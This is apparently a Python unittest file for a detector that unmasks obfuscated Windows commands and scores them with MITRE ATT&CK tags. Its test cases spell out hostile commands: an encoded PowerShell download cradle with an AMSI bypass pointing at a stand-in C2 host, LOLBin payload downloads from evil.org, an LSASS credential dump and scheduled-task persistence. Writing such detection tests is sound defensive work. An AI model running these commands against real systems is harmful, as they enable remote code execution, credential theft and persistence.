import base64
import gzip
import io
import unittest
from contextlib import redirect_stdout

from cmd_unmask import Severity, unmask_command
from cmd_unmask.cli import main


class TestBehavioralClassifierAndVerdictScoring(unittest.TestCase):
    def test_benign_admin_commands_score_zero_and_benign(self) -> None:
        benign_commands = [
            "ipconfig /all",
            "dir C:\\Windows\\System32",
            "git status && python -m unittest",
            "Get-Service | Where-Object {$_.Status -eq 'Running'}",
            "Get-ChildItem -Path C:\\Logs -Filter *.log",
        ]
        for cmd in benign_commands:
            with self.subTest(cmd=cmd):
                verdict = unmask_command(cmd)
                self.assertEqual(verdict.risk_score, 0)
                self.assertEqual(verdict.severity, Severity.BENIGN)
                self.assertEqual(verdict.behavioral_matches, [])

    def test_multilayer_obfuscated_powershell_cradle_scores_critical_with_mitre_tags(self) -> None:
        # Combine DOSfuscation + Base64 UTF-16LE + Gzip + Format operator + DownloadString + AMSI bypass
        inner_script = (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); "
            "IEX (New-Object (\"{1}{0}\" -f 'WebClient','Net.')).DownloadString('http://c2.evil.example:8080/stage2.ps1')"
        )
        compressed = gzip.compress(inner_script.encode("utf-8"))
        b64_gzip = base64.b64encode(compressed).decode("ascii")
        stage1 = (
            "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('"
            + b64_gzip
            + "')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )
        b64_utf16 = base64.b64encode(stage1.encode("utf-16le")).decode("ascii").rstrip("=")
        outer_cmd = f"p^o^w^e^r^s^h^e^l^l.exe -NoP -W Hidden -enc {b64_utf16}"

        verdict = unmask_command(outer_cmd)
        self.assertGreaterEqual(verdict.risk_score, 85)
        self.assertEqual(verdict.severity, Severity.CRITICAL)

        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1027.010", mitre_ids)  # Command Obfuscation
        self.assertIn("T1140", mitre_ids)      # Deobfuscate/Decode
        self.assertIn("T1059.001", mitre_ids)  # PowerShell
        self.assertIn("T1105", mitre_ids)      # Ingress Tool Transfer
        self.assertIn("T1562.001", mitre_ids)  # AMSI/Defender bypass

    def test_lolbins_credential_dumping_and_persistence_detection(self) -> None:
        cases = [
            ("mshta.exe vbscript:Execute(\"CreateObject('WScript.Shell').Run 'http://evil.org/a.hta'\")", "T1218.005"),
            ("regsvr32 /s /n /u /i:http://evil.org/file.sct scrobj.dll", "T1218.010"),
            ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full", "T1003"),
            ("certutil.exe -urlcache -split -f http://evil.org/payload.exe C:\\Temp\\payload.exe", "T1105"),
            ("schtasks /create /tn Updater /tr C:\\Users\\Public\\beacon.exe /sc onlogon", "T1053"),
            ("bitsadmin /transfer myJob /download /priority high http://evil.org/a.exe C:\\Temp\\a.exe", "T1105"),
            ("msiexec /q /i http://evil.org/pkg.msi", "T1218.007"),
        ]
        for cmd, expected_mitre in cases:
            with self.subTest(cmd=cmd):
                verdict = unmask_command(cmd)
                self.assertGreater(verdict.risk_score, 0)
                self.assertNotEqual(verdict.severity, Severity.BENIGN)
                self.assertTrue(
                    any(m.mitre_id.startswith(expected_mitre) for m in verdict.behavioral_matches),
                    f"Expected {expected_mitre} in {[m.mitre_id for m in verdict.behavioral_matches]}",
                )

    def test_heavily_obfuscated_command_never_scores_benign(self) -> None:
        # Even if inner payload is a generic echo, multi-layer obfuscation itself is suspicious
        b64 = base64.b64encode("Write-Output hello".encode("utf-16le")).decode("ascii")
        verdict = unmask_command(f"p^o^w^e^r^s^h^e^l^l -enc {b64}")
        self.assertGreater(verdict.risk_score, 0)
        self.assertNotEqual(verdict.severity, Severity.BENIGN)

    def test_cli_fail_on_gate_exit_codes(self) -> None:
        buf = io.StringIO()
        with redirect_stdout(buf):
            code_trig = main([
                "-c",
                "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.org/a')",
                "--fail-on",
                "HIGH",
            ])
        self.assertEqual(code_trig, 2)

        with redirect_stdout(buf):
            code_ok = main([
                "-c",
                "ipconfig /all",
                "--fail-on",
                "LOW",
            ])
        self.assertEqual(code_ok, 0)

    def test_real_download_cradle_scores_high_or_critical(self) -> None:
        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
        verdict = unmask_command(cmd)
        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
        self.assertGreaterEqual(verdict.risk_score, 60)
        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
        self.assertIn("T1105", mitre_ids)


if __name__ == "__main__":
    unittest.main()
